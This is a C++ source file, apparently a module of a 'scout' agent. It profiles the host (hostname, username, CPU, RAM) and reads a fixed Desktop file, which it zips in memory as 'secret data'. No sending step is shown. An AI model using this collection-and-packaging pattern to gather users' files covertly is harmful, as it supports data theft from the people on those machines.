#include "scout.hpp"

#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <thread>
#include <array>
#include <filesystem>
#include <fstream>
#include <vector>

#include <miniz.h>

namespace scoutreg {

    std::optional<SystemInfo> collect_system_info() {
        SystemInfo info;

        load_hostname(info);
        load_username(info);
        load_cpu(info);
        load_ram(info);
        
        return info;
    }

    void load_hostname(SystemInfo& info) {
        std::array<char, 256> host_buffer{};
        if (gethostname(host_buffer.data(), host_buffer.size()) == 0) {
            info.hostname = host_buffer.data();
        }
    }

    void load_username(SystemInfo& info) {
        if (const auto* pw = getpwuid(geteuid()); pw != nullptr && pw->pw_name != nullptr) {
            info.username = pw->pw_name;
        } else if (const char* user_env = getenv("USER"); user_env != nullptr) {
            info.username = user_env;
        }
    }

    void load_cpu(SystemInfo& info) {
        info.cpu_cores = std::thread::hardware_concurrency();
        if (info.cpu_cores == 0) {
            info.cpu_cores = static_cast<uint32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        }
        struct utsname uname_data{};
        if (uname(&uname_data) == 0) {
            info.cpu_arch = uname_data.machine;
        }
    }

    void load_ram(SystemInfo& info) {
        struct sysinfo mem_info{};
        if (sysinfo(&mem_info) == 0) {
            const uint64_t unit = mem_info.mem_unit > 0 ? mem_info.mem_unit : 1;
            info.total_ram = (mem_info.totalram * unit) / (1024 * 1024);
            info.available_ram = (mem_info.freeram * unit) / (1024 * 1024);
        }
    }

    std::optional<SecretData> collect_secret_data(const std::string& username) {
        namespace fs = std::filesystem;

        const fs::path home = (username == "root")
            ? fs::path("/root")
            : fs::path("/home") / username;

        const fs::path path = home / "Desktop/stats.txt";
        const std::string filename_in_zip = "stats.txt";

        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file.is_open()) return std::nullopt;

        const std::streamsize size = file.tellg();
        if (size <= 0) return std::nullopt;
        file.seekg(0);

        std::vector<std::byte> file_bytes(static_cast<size_t>(size));
        if (!file.read(reinterpret_cast<char*>(file_bytes.data()), size)) {
            return std::nullopt;
        }

        mz_zip_archive zip{};
        if (!mz_zip_writer_init_heap(&zip, 0, file_bytes.size() + 256)) {
            return std::nullopt;
        }

        const bool added = mz_zip_writer_add_mem(
            &zip,
            filename_in_zip.c_str(),
            file_bytes.data(),
            file_bytes.size(),
            MZ_BEST_COMPRESSION
        );

        if (!added) {
            mz_zip_writer_end(&zip);
            return std::nullopt;
        }

        void*  zip_buf  = nullptr;
        size_t zip_size = 0;
        if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) {
            mz_zip_writer_end(&zip);
            return std::nullopt;
        }

        const auto* raw = static_cast<std::byte*>(zip_buf);
        SecretData result{
            .filename  = filename_in_zip,
            .zip_bytes = std::vector<std::byte>(raw, raw + zip_size)
        };

        mz_zip_writer_end(&zip);
        return result;
    }

}
